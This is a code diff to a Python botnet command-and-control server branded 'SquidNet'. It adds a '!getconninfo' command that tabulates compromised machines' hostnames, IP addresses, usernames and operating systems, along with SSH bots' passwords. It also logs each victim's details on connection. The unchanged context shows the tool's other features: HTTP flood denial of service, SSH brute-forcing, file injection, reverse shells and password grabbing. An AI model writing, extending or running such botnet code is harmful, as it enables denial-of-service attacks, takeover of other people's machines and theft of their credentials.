@@ -172,7 +172,7 @@ class Botnet:
                 self.log(
                     "\n[(ERROR)]: Error starting up server - Brute-forcing file is not in directory!\n[(CLOSE)]: Server is closing.....")
             sys.exit()
-        self.version = "6.9"
+        self.version = "6.942.0"
         self.conn_list = []
         self.admin_conn = []
         self.ips = []
@@ -202,8 +202,10 @@ class Botnet:
         self.logo()
         self.savefile = False
         self.welcomemsg = """
-[(SERVER)]: List of Commands:
+[(SERVER)]: 
+[+] List of Commands:
 [+] !help                                - Displays this message.
+[+] !getconninfo                         - Displays info about all of the connections.
 
 [+] Commands for TCP Botnet:
 
@@ -263,14 +265,14 @@ class Botnet:
     def log_logo(self):
         """Logo of this script."""
         logo = """
-  _____             _     _ _   _      _             __  ___  
- / ____|           (_)   | | \ | |    | |           / / / _ \ 
-| (___   __ _ _   _ _  __| |  \| | ___| |_  __   __/ /_| (_) |
- \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / / '_ \ __, |
- ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V /| (_) | / / 
-|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_/  \___(_)_/  
-           | |                                                
-           |_|                                                                                                                                                     
+  _____             _     _ _   _      _             __  ___  _  _ ___    ___  
+ / ____|           (_)   | | \ | |    | |           / / / _ \| || |__ \  / _ \ 
+| (___   __ _ _   _ _  __| |  \| | ___| |_  __   __/ /_| (_) | || |_ ) || | | |
+ \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / / '_ \ __, |__   _/ / | | | |
+ ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V /| (_) | / /   | |/ /_ | |_| |
+|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_/  \___(_)_/    |_|____(_)___/ 
+           | |                                                                 
+           |_|                                                                                                                                                               
 TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
         return logo
     def logo(self):
@@ -281,6 +283,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
         print("\n[+] Commands:\n")
         print("[+] !help                                - Displays all of the commands.")
         print("[+] !whatsnew                            - Displays all new features.")
+        print("[+] !getconninfo                         - Displays info about all of the connections.")
         print("[+] !clear                               - Clears the output.")
         print("\n[+] Commands for TCP Botnet:\n")
         print("[+] !httpflood [website] [delay]         - Denial Of Services the website provided.")
@@ -382,6 +385,14 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
                     opsys = split_msg[3]
                 except:
                     opsys = "Unknown"
+                self.log(f"""
+[({hostname})---->(SERVER)]:
+[+] HOSTNAME: {hostname}
+[+] IPADDR  : {ipaddr}
+[+] USERNAME: {user}
+[+] CONNN   : {connection}
+[+] OS      : {opsys}
+                """)
                 info = str(hostname+" "+ipaddr+" "+user+" "+connection+" "+opsys)
                 self.info.append(info)
                 print(f"\n[!] {hostname} has connected to the botnet.")
@@ -404,12 +415,54 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
             self.serverlog = open(self.logfile, "w")
             self.serverlog.write(msg)
             self.serverlog.close()
+    def wrap_item(self, word,size):
+        """Wraps the items from the conn-list and aligns it in the table."""
+        item = word
+        while len(item)+2 <= size-1:
+            item += " "
+        return item
+    def gen_conntable(self):
+        """Generates the connection table with info about each connection.
+        This is similar to the information displayed in the Web-Interface."""
+        result = """
+Regular Connections:
+______________________________________________________________________________________
+|                       |                  |              |              |           |
+|       Hostname        |    IP Address    |   Username   |  Connection  |    OS     |
+|_______________________|__________________|______________|______________|___________|"""
+        for info in self.info:
+            split_info = info.split()
+            result += f"\n| {self.wrap_item(split_info[0], 24)}| {self.wrap_item(split_info[1], 19)}| {self.wrap_item(split_info[2], 15)}| {self.wrap_item(split_info[3], 15)}| {self.wrap_item(split_info[4], 12)}|"
+        result += "\n|_______________________|__________________|______________|______________|___________|"
+        result += """
+        
+Admin Connections:
+______________________________________________________________________________________
+|                       |                  |              |              |           |
+|       Hostname        |    IP Address    |   Username   |  Connection  |    OS     |
+|_______________________|__________________|______________|______________|___________|"""
+        for info in self.admininfo:
+            split_info = info.split()
+            result += f"\n| {self.wrap_item(split_info[0], 24)}| {self.wrap_item(split_info[1], 19)}| {self.wrap_item(split_info[2], 15)}| {self.wrap_item(split_info[3], 15)}| {self.wrap_item(split_info[4], 12)}|"
+        result += "\n|_______________________|__________________|______________|______________|___________|"
+        result += """
+
+SSH Connections:
+________________________________________________________
+|                       |               |              |
+|       Hostname        |  IP Address   |   Password   |
+|_______________________|_______________|______________|"""
+        for info in self.ssh_info:
+            split_info = info.split()
+            result += f"\n| {self.wrap_item(split_info[0], 24)}| {self.wrap_item(split_info[1], 19)}| {self.wrap_item(split_info[2], 15)}|"
+        result += "\n|_______________________|_______________|______________|\n"
+        return result
     def handler(self, c, hostname, number, info):
         """Function recieves packets from the connections. This is needed for clients
         to send packets to the botnet so the Admin can see what the Bots are sending.
         This is needed also for password grabbing and information obtaining. This
         function is also important for admin connections as they need to send and
-        recieve packets."""
+        recieve packets. It also handles the connections, and keeps them alive."""
         admin = False
         isbot = False
         while True:
@@ -551,6 +604,9 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
                             password = msg_split[3]
                             login = threading.Thread(target=self.ssh_login,args=(ip, username, password))
                             login.start()
+                        elif msg.startswith("!getconninfo"):
+                            c.send(self.gen_conntable().encode())
+                            self.log(f"[(SERVER)---->({hostname})]:\n{self.gen_conntable()}")
                         elif msg.startswith("!inject"):
                             msg_split = msg.split()
                             file = msg_split[1]
@@ -559,14 +615,16 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
                         elif msg.startswith("!listsshbots"):
                             c.send(f"[(SERVER)]: Connected SSH Bots: {self.display_bots}".encode())
                             self.log(f"[(SERVER)---->({hostname})]: Connected SSH Bots: {self.display_bots}")
-                        if len(self.ssh_bots) != 0:
-                            sendtossh = threading.Thread(target=self.send_ssh, args=(msg,))
-                            sendtossh.start()
-                        for connect in self.conn_list:
-                            if connect in self.admin_conn:
-                                pass
-                            else:
-                                if "!login" not in msg and "!help" not in msg:
+                        if "!login" in msg and "!help" in msg or "!getconninfo" in msg or "!getconninfo" in msg:
+                            pass
+                        else:
+                            if len(self.ssh_bots) != 0:
+                                sendtossh = threading.Thread(target=self.send_ssh, args=(msg,))
+                                sendtossh.start()
+                            for connect in self.conn_list:
+                                if connect in self.admin_conn:
+                                    pass
+                                else:
                                     try:
                                         connect.send(msg.encode())
                                     except:
@@ -616,8 +674,8 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
                                     adminconn.send(msgtoadmin.encode())
                             except Exception as e:
                                 self.log(f"\n[(ERROR)]: Unable to send msg to: {adminconn}.")
-            except:
-                self.log(f"\n[(ERROR)]: {hostname} seems defective.\n[(CLOSECONN)]: Closing connection....")
+            except Exception as e:
+                self.log(f"\n[(ERROR)]: {hostname} seems defective(Error: {e}).\n[(CLOSECONN)]: Closing connection....")
                 print(f"\n[+] {hostname} seems defective.\n[+] Closing connection....\n")
                 c.close()
                 break
@@ -866,6 +924,9 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
                     username = msg_split[2]
                     password = msg_split[3]
                     self.ssh_login(ip, username, password)
+                elif self.instruction.startswith("!getconninfo"):
+                    print(self.gen_conntable())
+                    self.log(f"[(SERVER)]: Displayed Conn Table for Server.\n{self.gen_conntable()}")
                 elif self.instruction.startswith("!editfile"):
                     msg_split = self.instruction.split()
                     filename = msg_split[1]
@@ -885,9 +946,10 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
 [+] - Made password list optional(however brute forcing cannot happen).
 [+] - Added '!cloneself' Command.
 [+] - Upgraded reverse shell messages.
+[+] - Added '!getconninfo' Command.
 [+] - Made it so that '!clear', '!genscript' and '!genadminscript' are not sent to the clients.
                     """)
-                if "!clear" in self.instruction.strip() or "!genscript" in self.instruction.strip() or "!genadminscript".strip() in self.instruction.strip() or "!whatsnew" in self.instruction.strip():
+                if "!clear" in self.instruction.strip() or "!genscript" in self.instruction.strip() or "!genadminscript".strip() in self.instruction.strip() or "!whatsnew" in self.instruction.strip() or "!getconninfo" in self.instruction.strip():
                     pass
                 else:
                     if len(self.ssh_bots) != 0:
@@ -4439,10 +4501,10 @@ class Bot:
             pass
     def getinfo(self):
         msg = f'''
-IP:       {self.getip()}
-CWD:      {os.getcwd()}
-USERNAME: {os.getlogin()}
-OS:       {sys.platform}
+[+] IP:       {self.getip()}
+[+] CWD:      {os.getcwd()}
+[+] USERNAME: {os.getlogin()}
+[+] OS:       {sys.platform}
         '''
         return msg
     def returnsecondstr(self, msg):
